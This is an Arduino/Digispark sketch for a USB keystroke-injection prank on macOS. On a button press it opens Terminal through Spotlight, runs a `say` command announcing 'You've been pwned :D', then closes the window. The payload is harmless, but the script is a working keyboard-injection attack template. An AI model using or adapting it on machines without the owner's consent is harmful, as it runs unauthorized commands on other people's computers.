/*
 *
 *  MacOS Speaker by BrightShard
 *  This script turns the volume up, opens the Terminal via Spotlight, 
 *  and then says the provided message
 *
 *  The script automatically waits depending on the length of the message and
 *  then closes the terminal
 *
 */

#include "DigiKeyboard.h"
#define MOD_VOLUME_UP 128
#define MOD_VOLUME_DOWN 129
int btnPressed = 1; // Track if btn is pressed
int canRun = true; // Track if script is running or not
int slowFactor = 1; // Turn this up for slow computers
const String msg = "You've been pwned :D"; // Message to say

// The actual keyboard attack
void script() {
  for(int x = 0; x < 10; x++) {
    DigiKeyboard.sendKeyStroke(MOD_VOLUME_UP); // Turn volume up 10 times
  }
  DigiKeyboard.sendKeyStroke(KEY_SPACE, MOD_GUI_LEFT); // Open Spotlight
  DigiKeyboard.delay(200 * slowFactor); // Wait for spotlight to open
  DigiKeyboard.println("Terminal"); // Open the terminal
  DigiKeyboard.delay(1000 * slowFactor); // Wait for the terminal to open
  DigiKeyboard.println("say \""+msg+"\""); // Type say command
  //DigiKeyboard.println(msg); // Append message & hit enter
  DigiKeyboard.delay((msg.length() * 100) * slowFactor); // Wait for message to finish
  DigiKeyboard.println("exit"); // Clear terminal
  DigiKeyboard.delay(50 * slowFactor); // Be nice to the computer
  DigiKeyboard.sendKeyStroke(KEY_Q, MOD_GUI_LEFT); // Close terminal
  for(int x = 0; x < 10; x++) {
    DigiKeyboard.sendKeyStroke(MOD_VOLUME_DOWN); // Turn volume down 10 times
  }
}

void setup() {
  pinMode(1, OUTPUT); // LED
  pinMode(0, INPUT); // Btn

  DigiKeyboard.update(); // Init keyboard
  DigiKeyboard.sendKeyStroke(0); // Make computer recognize keyboard, needed for older systems
  DigiKeyboard.delay(500 * slowFactor); // Let computer register keyboard

  digitalWrite(0, HIGH); // Give btn power
  digitalWrite(1, HIGH); // Turn on LED, showing the script is ready to run
}

void loop() {
  DigiKeyboard.update(); // Keep keyboard alive
  btnPressed = digitalRead(0); // Check if btn is pressed or not
  if (btnPressed == 0 && canRun == true) {
    digitalWrite(1, LOW); // Turn off LED, showing the script is running
    canRun = false; // Script is running and shouldn't be launched again
    script(); // Run the attack
    DigiKeyboard.delay(500 * slowFactor); // Delay between attacks for stability
    digitalWrite(1, HIGH); // Turn on LED, showing the script can be run
    canRun = true; // Script has run and it's OK to launch it again
  }
}
